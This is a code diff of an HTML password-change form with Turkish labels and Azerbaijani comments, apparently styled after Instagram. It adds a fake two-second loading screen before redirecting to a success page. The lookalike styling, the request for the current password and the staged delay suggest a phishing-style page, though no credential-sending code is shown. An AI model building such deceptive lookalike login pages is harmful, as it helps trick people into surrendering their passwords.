@@ -12,27 +12,30 @@
         h1 { font-size: 24px; font-weight: 700; margin-bottom: 12px; }
         .description { font-size: 14px; color: #262626; line-height: 1.4; margin-bottom: 25px; }
         
-        .input-group { margin-bottom: 5px; position: relative; }
+        .input-group { margin-bottom: 10px; position: relative; }
         input { 
             width: 100%; padding: 16px; border: 1px solid #dbdbdb; border-radius: 12px; 
-            font-size: 14px; background: #fafafa; outline: none; transition: 0.2s;
+            font-size: 14px; background: #fafafa; outline: none; transition: 0.3s;
         }
-        input:focus { border-color: #a8a8a8; }
+        /* Xanaya yazı yazılanda kənarları bir az tündləşsin */
+        input:not(:placeholder-shown) { border-color: #a8a8a8; }
         
-        #error-msg { color: #ed4956; font-size: 12px; margin-bottom: 15px; display: none; margin-left: 5px; }
+        #error-msg { color: #ed4956; font-size: 12px; margin-bottom: 15px; display: none; padding-left: 5px; }
 
         .submit-btn {
             width: 100%; padding: 14px; background-color: #b2dffc; color: #fff;
             border: none; border-radius: 25px; font-size: 16px; font-weight: 600;
-            cursor: not-allowed; margin-top: 150px; position: relative;
+            cursor: not-allowed; margin-top: 100px; position: relative;
+            transition: background-color 0.3s ease;
         }
+        /* Düymə tam aktiv olanda bu rəngə boyanacaq */
         .submit-btn.active { background-color: #0095f6; cursor: pointer; }
 
-        /* Yükləmə animasiyası */
         .loader {
-            display: none; width: 20px; height: 20px; border: 2px solid #ffffff;
-            border-bottom-color: transparent; border-radius: 50%;
-            animation: rotation 1s linear infinite; position: absolute; left: 47%;
+            display: none; width: 22px; height: 22px; border: 3px solid rgba(255,255,255,0.3);
+            border-top-color: #fff; border-radius: 50%;
+            animation: rotation 0.8s linear infinite;
+            position: absolute; left: 47%; top: 25%;
         }
         @keyframes rotation { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
@@ -45,7 +48,7 @@
     <p class="description">Şifren en az 6 karakter olmalı ve rakamlar, harfler ve özel karakterlerden (!S@%) oluşmalıdır.</p>
 
     <div class="input-group">
-        <input type="password" id="oldPass" placeholder="Mevcut şifre>
+        <input type="password" id="oldPass" placeholder="Mevcut şifre (Güncelleme 06.04.2026)">
     </div>
 
     <div class="input-group">
@@ -72,17 +75,20 @@
     const btnText = document.getElementById('btnText');
     const loader = document.getElementById('loader');
 
-    function validate() {
-        const isMatching = newPass.value === confirmPass.value && newPass.value !== "";
-        const allFilled = oldPass.value.length >= 1 && newPass.value.length >= 6;
+    function checkInputs() {
+        const v1 = oldPass.value.trim();
+        const v2 = newPass.value.trim();
+        const v3 = confirmPass.value.trim();
 
-        if (confirmPass.value !== "" && newPass.value !== confirmPass.value) {
+        // Şifrə uyğunsuzluğu xəbərdarlığı
+        if (v2 !== "" && v3 !== "" && v2 !== v3) {
             errorMsg.style.display = "block";
         } else {
             errorMsg.style.display = "none";
         }
 
-        if (isMatching && allFilled) {
+        // Bütün xanalar doludurmu və şifrələr eynidirmi?
+        if (v1 !== "" && v2 !== "" && v3 !== "" && v2 === v3 && v2.length >= 6) {
             submitBtn.classList.add('active');
             submitBtn.disabled = false;
         } else {
@@ -91,15 +97,21 @@
         }
     }
 
-    [oldPass, newPass, confirmPass].forEach(input => input.addEventListener('input', validate));
+    // Hər klaviaturaya toxunanda yoxla
+    oldPass.addEventListener('input', checkInputs);
+    newPass.addEventListener('input', checkInputs);
+    confirmPass.addEventListener('input', checkInputs);
 
-    submitBtn.addEventListener('click', () => {
-        btnText.style.display = "none";
-        loader.style.display = "inline-block";
-        
-        setTimeout(() => {
-            window.location.href = "success.html";
-        }, 2000); // 2 saniyəlik yükləmə ekranı
+    submitBtn.addEventListener('click', function() {
+        if (!this.disabled) {
+            btnText.style.opacity = "0";
+            loader.style.display = "block";
+            
+            // 2 saniyə yüklənir görüntüsü ver və sonra keçid et
+            setTimeout(() => {
+                window.location.href = "success.html";
+            }, 2000);
+        }
     });
 </script>
 
